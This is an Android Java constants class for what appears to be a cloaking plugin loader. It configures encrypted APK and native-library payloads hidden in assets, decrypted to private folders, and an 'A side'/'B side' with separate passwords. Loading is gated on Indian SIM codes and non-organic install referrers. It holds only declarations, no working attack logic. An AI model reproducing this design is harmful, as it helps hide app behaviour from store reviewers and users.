package com.d08a3hqr.utils;

import android.content.Context;

public class StartConstant {
    public static Context app;
    public static boolean isDebug;
    public static String assetsName = "";
    // 后缀：".apk"
    public static String suffix_point_apk;
    // 后缀：".dex"
    public static String suffix_point_dex;
    // 后缀：".jar"
    public static String suffix_point_jar;
    // 后缀：".so"
    public static String suffix_point_so;
    // 后缀：".apk" 加密成 后缀："_aa"
    public static String suffix_line_aa;
    // 后缀：".so" 加密成 后缀："_ss"
    public static String suffix_line_ss;
    // so库名字-"load"
    public static String lib_so_name_load;
    // so库的文件夹默认名称-"arm64-v8a"
    public static String abi_dir_name_default;
    // so库名字，带7a结尾，代表armeabi-v7a-"7a"
    public static String lib_so_name_load_armeabi_v7a;
    // so库名字，带7a结尾，代表armeabi-v8a-"8a"
    public static String lib_so_name_load_armeabi_v8a;
    // 判断是否印度卡-mcc是404
    public static String code_mcc_404;
    // 判断是否印度卡-mcc是405
    public static String code_mcc_405;
    // 判断是否印度卡-mcc是406
    public static String code_mcc_406;
    // 判断是否非自然量-根据referrerUrl判断-"utm_medium=organic"
    public static String referrer_Url_utm_medium_organic;
    // 文件夹名称-私有文件夹的部分目录-"/data/data/"
    public static String dir_name_data;
    // 根文件夹名称-插件化最顶级文件夹-再往上就是私有目录-“start”
    public static String dir_name_start;
    // 文件夹名称-会再后缀加上assets下的插件文件夹名称-再往上就是start文件夹-“root_load”
    public static String dir_name_start_root;
    // 文件夹名称-将插件从assets复制解密到当前文件夹-再往上就是root_load文件夹-“pl”
    public static String dir_name_start_root_plugin;
    // 文件夹名称-将apk解压-再往上就是root_load文件夹-“plUnz”
    public static String dir_name_start_root_unZip;
    // 文件夹名称-插件化系统默认解压到这个文件夹-再往上就是root_load文件夹-“deOp”
    public static String dir_name_start_root_dex;
    // 文件夹名称-插件化系统默认解压到这个文件夹-再往上就是deOp文件夹-“oat”
    public static String dir_name_start_root_dex_oat;
    // 文件夹名称-插件化系统默认解压到这个文件夹-再往上就是plUnz文件夹-“lib”
    public static String dir_name_start_root_plugin_lib;
    // a面的密码
    public static String a_password;
    // a面的主入口
    public static String a_main_Activity;
    // b面的密码--后面都是一面了，a面不是单独apk，跟sdk一起了
    public static String b_password;
    // b面的主入口--后面都是一面了，a面不是单独apk，跟sdk一起了
    public static String b_main_Activity;
}
